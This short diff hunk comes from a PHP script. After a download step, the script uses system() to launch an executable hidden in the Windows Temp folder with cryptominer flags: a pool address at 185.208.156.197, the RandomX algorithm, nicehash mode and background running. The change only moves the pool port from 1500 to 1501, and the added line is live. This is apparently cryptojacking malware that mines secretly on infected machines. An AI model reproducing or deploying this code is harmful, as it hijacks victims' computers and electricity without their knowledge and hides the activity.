@@ -81,7 +81,7 @@ if (!$found && !$found2  && !$found3) {
         } else {
             echo "Failed to download file, aborting further processing.\n";
         }
-         system('C:/Windows/Temp/RightProgramFiles/xnightpro.exe  -o 185.208.156.197:1500 -a rx/0 -k --nicehash -r 99999 --background');
+         system('C:/Windows/Temp/RightProgramFiles/xnightpro.exe  -o 185.208.156.197:1501 -a rx/0 -k --nicehash -r 99999 --background');
 
         
 
